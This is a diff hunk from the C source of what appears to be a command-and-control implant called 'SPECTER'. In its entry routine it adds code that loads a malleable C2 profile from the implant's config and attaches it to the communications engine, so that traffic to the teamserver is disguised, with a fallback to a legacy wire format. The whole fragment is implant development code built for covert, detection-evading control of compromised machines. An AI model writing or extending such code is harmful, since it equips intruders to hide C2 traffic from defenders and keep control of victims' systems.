@@ -279,16 +279,20 @@ void implant_entry(PVOID param) {
     }
 
     /* ---- Step 7b: Initialize malleable C2 profile (if embedded) ---- */
-    /* Profile blob is expected to be provided via config update or
-     * embedded after config blob. When available, parse and attach
-     * to comms engine for profile-driven traffic shaping. */
     {
-        static PROFILE_CONFIG g_profile_cfg;
-        /* TODO: Locate profile blob (e.g., second config region or
-         * delivered via initial config update from teamserver).
-         * For now, profile is set via comms_set_profile() after
-         * a profile blob is received from the teamserver. */
-        (void)g_profile_cfg;
+        IMPLANT_CONFIG *cfg = cfg_get(&g_ctx);
+        if (cfg && cfg->profile_blob && cfg->profile_blob_len > 0) {
+            static PROFILE_CONFIG g_profile_cfg;
+            NTSTATUS pstatus = profile_init(cfg->profile_blob, cfg->profile_blob_len, &g_profile_cfg);
+            if (NT_SUCCESS(pstatus)) {
+                comms_set_profile(&g_ctx, &g_profile_cfg);
+                DEV_TRACE("[SPECTER] profile attached to comms");
+            } else {
+                DEV_TRACE("[SPECTER] profile_init failed, using legacy wire format");
+            }
+        } else {
+            DEV_TRACE("[SPECTER] no profile blob in config, using legacy wire format");
+        }
     }
 
     /* ---- Step 8: Enter main loop ---- */
